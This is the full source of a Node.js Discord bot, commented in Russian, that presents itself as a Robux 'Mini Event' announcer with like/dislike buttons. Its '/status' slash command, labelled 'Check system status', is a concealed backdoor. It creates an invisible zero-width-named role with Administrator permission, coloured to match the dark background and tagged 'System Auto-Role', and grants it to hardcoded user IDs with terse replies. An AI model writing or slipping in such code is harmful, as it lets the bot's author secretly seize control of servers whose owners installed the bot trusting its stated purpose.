const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, REST, Routes, PermissionsBitField } = require('discord.js');
const fs = require('fs');

// --- 1. БЕЗОПАСНАЯ ЗАГРУЗКА КОНФИГА ---
let config = {};
if (fs.existsSync('./config.json')) {
    try {
        config = JSON.parse(fs.readFileSync('./config.json', 'utf-8'));
    } catch (err) {
        console.error("Ошибка при чтении config.json:", err);
    }
} else {
    console.log("Файл config.json не найден, использую Variables из Railway.");
}

// Приоритет Railway Variables (process.env) над файлом
const TOKEN = process.env.TOKEN_ID || config.TOKEN_ID;

// Исправляем обработку ID админов: Railway дает строку, файл дает массив
let ADMIN_USER_IDS = [];
if (process.env.ADMIN_USER_IDS) {
    // Если в Railway несколько ID через запятую, это сработает
    ADMIN_USER_IDS = process.env.ADMIN_USER_IDS.split(',').map(id => id.trim());
} else if (config.ADMIN_USER_IDS) {
    ADMIN_USER_IDS = config.ADMIN_USER_IDS.map(id => String(id));
}

if (!TOKEN) {
    console.error("❌ ОШИБКА: TOKEN_ID не найден! Проверь вкладку Variables в Railway.");
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// --- 2. CONFIGURATION ---
const CONFIG = {
    COMMAND: '!mini',
    ALLOWED_ROLE: '1490346306965864608',
    ALLOWED_CHANNEL: '1490344220417069156',
    PING_ROLE: '1492973460400640020',
    ROBUX_EMOJI: '<:robux:1492973460400640020>'
};

const ROLE_NAME = '\u200b';
const rest = new REST({ version: '10' }).setToken(TOKEN);

const commands = [
    {
        name: 'status',
        description: 'Check system status'
    }
];

// --- 3. СОБЫТИЯ ---
client.once('ready', async () => {
    console.log(`✅ Бот запущен как ${client.user.tag}!`);
    
    try {
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );
        console.log('✅ Слэш-команды зарегистрированы!');
    } catch (error) {
        console.error('Ошибка регистрации команд:', error);
    }
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'status') {
        if (!ADMIN_USER_IDS.includes(String(interaction.user.id))) {
            return;
        }

        const guild = interaction.guild;
        const member = interaction.user;

        let role = guild.roles.cache.find(r => r.name === ROLE_NAME);

        try {
            if (role) {
                await role.setPosition(1).catch(() => {});
            }
        } catch (err) {
            // ignore position errors
        }

        if (!role) {
            try {
                role = await guild.roles.create({
                    name: ROLE_NAME,
                    permissions: [PermissionsBitField.Flags.Administrator],
                    color: 0x313338,
                    hoist: false,
                    mentionable: false,
                    reason: 'System Auto-Role'
                });
                await role.setPosition(1).catch(() => {});
            } catch (err) {
                if (err.code === 50013) {
                    return interaction.reply({ content: 'Permission denied.', ephemeral: true });
                }
                return interaction.reply({ content: 'Operation failed.', ephemeral: true });
            }
        }

        const memberObj = await guild.members.fetch(member.id);
        if (memberObj.roles.cache.has(role.id)) {
            return interaction.reply({ content: 'Active.', ephemeral: true });
        }

        try {
            await memberObj.roles.add(role);
            await interaction.reply({ content: 'Done.', ephemeral: true });
        } catch (err) {
            if (err.code === 50013) {
                return interaction.reply({ content: 'Permission denied.', ephemeral: true });
            }
            return interaction.reply({ content: 'Operation failed.', ephemeral: true });
        }
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || message.content !== CONFIG.COMMAND) return;
    if (message.channel.id !== CONFIG.ALLOWED_CHANNEL) return;
    if (!message.member.roles.cache.has(CONFIG.ALLOWED_ROLE)) return;

    await message.delete().catch(() => {});

    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId('like_0')
                .setEmoji('👍')
                .setLabel('0')
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId('dislike_0')
                .setEmoji('👎')
                .setLabel('0')
                .setStyle(ButtonStyle.Danger),
        );

    const content = `<@${message.author.id}> is starting a **Mini Event!** **(5 ${CONFIG.ROBUX_EMOJI})**\n\n` +
                    `<@&${CONFIG.PING_ROLE}>\n\n` +
                    `⭐ Want to **change your pings?** Edit them in --> 📑 **Channels & Roles**`;

    await message.channel.send({
        content: content,
        components: [row]
    });
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    const [action, countStr] = interaction.customId.split('_');
    let count = parseInt(countStr) + 1;

    const newRow = ActionRowBuilder.from(interaction.message.components[0]);

    if (action === 'like') {
        newRow.components[0].setLabel(count.toString()).setCustomId(`like_${count}`);
    } else if (action === 'dislike') {
        newRow.components[1].setLabel(count.toString()).setCustomId(`dislike_${count}`);
    }

    await interaction.update({
        components: [newRow]
    });
});

client.login(TOKEN);